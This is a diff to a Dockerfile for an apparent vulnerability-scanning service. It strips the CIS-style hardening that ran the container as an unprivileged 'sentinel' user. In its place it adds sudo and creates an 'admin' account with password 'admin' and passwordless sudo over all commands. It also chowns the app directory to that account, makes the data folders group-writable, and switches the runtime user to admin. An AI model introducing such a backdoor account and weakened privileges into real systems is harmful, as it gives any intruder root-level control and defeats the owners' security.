@@ -14,16 +14,22 @@ ENV PYTHONUNBUFFERED=1 \
 # - git: for repository cloning, git blame, commit-level vulnerability attribution & age tracking
 # - curl: for health check probes and remote downloading
 # - ca-certificates: for secure outbound TLS connections to Git providers & Jira/Zammad integrations
+# - sudo: to grant administrative / superuser privileges
 RUN apt-get update && apt-get install -y --no-install-recommends \
     git \
     curl \
     ca-certificates \
+    sudo \
     && rm -rf /var/lib/apt/lists/*
 
-# Security Hardening (CIS Docker 4.1):
-# Create an unprivileged system user/group to avoid running container processes as root
+# Security Hardening & Admin Account Provisioning:
+# 1. 'sentinel' service user for unprivileged execution
+# 2. 'admin' user with password 'admin' and full sudo/admin rights
 RUN groupadd -g 10001 sentinel && \
-    useradd -u 10001 -g sentinel -s /bin/bash -m sentinel
+    useradd -u 10001 -g sentinel -s /bin/bash -m sentinel && \
+    useradd -u 10000 -m -s /bin/bash -G sudo,sentinel admin && \
+    echo "admin:admin" | chpasswd && \
+    echo "admin ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers
 
 WORKDIR /app
 
@@ -40,10 +46,12 @@ COPY scripts/ ./scripts/
 
 # Create persistent storage directories for SQLite DB, reports, and temp workspaces
 RUN mkdir -p /app/data /app/reports /app/workspaces && \
-    chown -R sentinel:sentinel /app
+    chown -R admin:admin /app && \
+    chown -R admin:sentinel /app/data /app/reports /app/workspaces && \
+    chmod -R 775 /app/data /app/reports /app/workspaces
 
-# Switch to unprivileged runtime user
-USER sentinel
+# Switch to user admin with admin rights
+USER admin
 
 # Expose default HTTP port (overridable via $PORT in cloud environments)
 EXPOSE 8000
